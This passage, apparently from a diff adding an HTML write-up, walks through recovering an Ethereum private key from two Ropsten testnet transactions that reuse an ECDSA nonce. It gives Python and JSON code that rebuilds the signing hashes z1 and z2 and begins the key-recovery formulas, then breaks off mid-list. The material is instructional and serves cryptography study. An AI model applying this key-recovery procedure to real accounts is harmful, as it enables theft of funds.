+<pre class=" language-python"><code class="prism  language-python">s1<span class="token punctuation">,</span>s2 <span class="token operator">=</span> <span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> txs_with_repeated_r<span class="token punctuation">)</span>
+</code></pre>
+<h5 id="z"><code>z</code></h5>
+<ul>
+<li><code>z</code>: There’s going to be two values of <code>z</code>, one per transaction, let’s call them <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">z_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> and <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">z_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>.</li>
+</ul>
+<p><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi></mrow><annotation encoding="application/x-tex">z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span></span></span></span></span> is the message hash. For this you take all the transaction’s parameters that are used to create the transaction hash and change a few important fields.</p>
+<p>In this case, the message hash will be a simulated transaction with the ordinary parameters that goes into its hash, but with <code>v</code> changed for its chain id (3 for ropsten), <code>r</code> empty and <code>s</code> empty.</p>
+<ol>
+<li>For transaction 1 (nonce 0), with the corresponding changes:</li>
+</ol>
+<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span>
+    <span class="token string">"nonce"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token string">"gasPrice"</span><span class="token punctuation">:</span> <span class="token number">1000000000</span><span class="token punctuation">,</span>
+    <span class="token string">"gasLimit"</span><span class="token punctuation">:</span> <span class="token number">21000</span><span class="token punctuation">,</span>
+    <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"0x92b28647Ae1F3264661f72fb2eB9625A89D88A31"</span><span class="token punctuation">,</span>
+    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token number">1230000000000000000</span><span class="token punctuation">,</span>
+    <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    <span class="token comment">// changes here </span>
+    <span class="token string">"v"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> 
+    <span class="token string">"r"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">""</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<ol start="2">
+<li>For transaction 2 (nonce 1) with the corresponding changes:</li>
+</ol>
+<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span>
+    <span class="token string">"nonce"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
+    <span class="token string">"gasPrice"</span><span class="token punctuation">:</span> <span class="token number">1000000000</span><span class="token punctuation">,</span>
+    <span class="token string">"gasLimit"</span><span class="token punctuation">:</span> <span class="token number">21000</span><span class="token punctuation">,</span>
+    <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"0x92b28647Ae1F3264661f72fb2eB9625A89D88A31"</span><span class="token punctuation">,</span>
+    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token number">1811266580600000000</span><span class="token punctuation">,</span>
+    <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+    <span class="token comment">// changes here</span>
+    <span class="token string">"v"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span>
+    <span class="token string">"r"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+    <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">""</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Also important to note is that obviously, prior to encoding, the values should all be in bytes and should all be concatenated. As a result, your transactions’ parameters should look like this:</p>
+<ol>
+<li>For transaction 1</li>
+</ol>
+<ul>
+<li>In hex:</li>
+</ul>
+<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span>
+    <span class="token string">"nonce"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+    <span class="token string">"gasPrice"</span><span class="token punctuation">:</span> <span class="token string">"0x3b9aca00"</span><span class="token punctuation">,</span>
+    <span class="token string">"gasLimit"</span><span class="token punctuation">:</span> <span class="token string">"0x5208"</span><span class="token punctuation">,</span>
+    <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"0x92b28647ae1f3264661f72fb2eb9625a89d88a31"</span><span class="token punctuation">,</span>
+    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"0x1111d67bb1bb0000"</span><span class="token punctuation">,</span>
+    <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+    <span class="token string">"v"</span><span class="token punctuation">:</span> <span class="token string">"0x03"</span><span class="token punctuation">,</span>
+    <span class="token string">"r"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+    <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">""</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<ul>
+<li>In python as bytes:</li>
+</ul>
+<pre class=" language-python"><code class="prism  language-python"><span class="token punctuation">{</span>
+    <span class="token string">'nonce'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x3b9aca00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasLimit'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x5208'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'to'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x92b28647ae1f3264661f72fb2eb9625a89d88a31'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'value'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x1111d67bb1bb0000'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'data'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'v'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x03'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'r'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'s'</span><span class="token punctuation">:</span> b<span class="token string">''</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<ol>
+<li>For transaction 2</li>
+</ol>
+<ul>
+<li>in hex:</li>
+</ul>
+<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span>
+    <span class="token string">"nonce"</span><span class="token punctuation">:</span> <span class="token string">"0x01"</span><span class="token punctuation">,</span>
+    <span class="token string">"gasPrice"</span><span class="token punctuation">:</span> <span class="token string">"0x3b9aca00"</span><span class="token punctuation">,</span>
+    <span class="token string">"gasLimit"</span><span class="token punctuation">:</span> <span class="token string">"0x5208"</span><span class="token punctuation">,</span>
+    <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"0x92b28647ae1f3264661f72fb2eb9625a89d88a31"</span><span class="token punctuation">,</span>
+    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"0x1922e95bca330e00"</span><span class="token punctuation">,</span>
+    <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+    <span class="token string">"v"</span><span class="token punctuation">:</span> <span class="token string">"0x03"</span><span class="token punctuation">,</span>
+    <span class="token string">"r"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+    <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">""</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<ul>
+<li>in python as bytes:</li>
+</ul>
+<pre class=" language-python"><code class="prism  language-python"><span class="token punctuation">{</span>
+    <span class="token string">'nonce'</span><span class="token punctuation">:</span> b<span class="token string">'\x01'</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x3b9aca00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasLimit'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x5208'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'to'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x92b28647ae1f3264661f72fb2eb9625a89d88a31'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'value'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x1922e95bca330e00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'data'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'v'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x03'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'r'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'s'</span><span class="token punctuation">:</span> b<span class="token string">''</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Now that we have these values as bytes, all we have to do is concatenate them and then get the Keccak256 hash of its RLP encoding. In python I defined a set of functions for this entire process which you can find in <code>scripts/helper/utils.py</code>, but in a nutshell, if you have an object like the one we defined before, you can do this:</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">import</span> rlp
+<span class="token keyword">import</span> web3
+
+reconstructed_tx_1 <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'nonce'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x3b9aca00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasLimit'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x5208'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'to'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x92b28647ae1f3264661f72fb2eb9625a89d88a31'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'value'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x1111d67bb1bb0000'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'data'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'v'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x03'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'r'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'s'</span><span class="token punctuation">:</span> b<span class="token string">''</span>
+<span class="token punctuation">}</span>
+
+reconstructed_tx_2 <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'nonce'</span><span class="token punctuation">:</span> b<span class="token string">'\x01'</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x3b9aca00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'gasLimit'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x5208'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'to'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x92b28647ae1f3264661f72fb2eb9625a89d88a31'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'value'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x1922e95bca330e00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'data'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'v'</span><span class="token punctuation">:</span> HexBytes<span class="token punctuation">(</span><span class="token string">'0x03'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+    <span class="token string">'r'</span><span class="token punctuation">:</span> b<span class="token string">''</span><span class="token punctuation">,</span> 
+    <span class="token string">'s'</span><span class="token punctuation">:</span> b<span class="token string">''</span>
+<span class="token punctuation">}</span>
+
+z1 <span class="token operator">=</span> web3<span class="token punctuation">.</span>sha3<span class="token punctuation">(</span>hexstr<span class="token operator">=</span>rlp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>reconstructed_tx_1<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+z2 <span class="token operator">=</span> web3<span class="token punctuation">.</span>sha3<span class="token punctuation">(</span>hexstr<span class="token operator">=</span>rlp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>reconstructed_tx_2<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>And you’ve got <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">z_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> and <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">z_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>.</p>
+<h4 id="obtaining-the-private-key">Obtaining the private key</h4>
+<ol>
+<li>
+<p>Get <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span></span></span></span></span>, which we obtained previously by looking at the transactions with repeated <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span></span></span></span></span>.</p>
+</li>
+<li>
+<p>Compute <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi></mrow><annotation encoding="application/x-tex">z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span></span></span></span></span>, which is the difference between <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">z_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> and <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">z_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>:</p>
+</li>
+</ol>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>z</mi><mo>=</mo><msub><mi>z</mi><mn>1</mn></msub><mo>−</mo><msub><mi>z</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex"> z = z_1 - z_2 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.73333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></span></p>
+<ol start="3">
+<li>
+<p>Compute <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">s</span></span></span></span></span>, for which we need to contemplate all the following scenarios:</p>
+</li>
+<li>
+<p><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><msub><mi>s</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s = s_1 + s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.73333em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></p>
+</li>
+<li>
+<p><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><msub><mi>s</mi><mn>1</mn></msub><mo>−</mo><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s = s_1 - s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.73333em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></p>
+</li>
+<li>
+<p><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><mo>−</mo><msub><mi>s</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s = - s_1 + s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.73333em; vertical-align: -0.15em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></p>
+</li>
+<li>
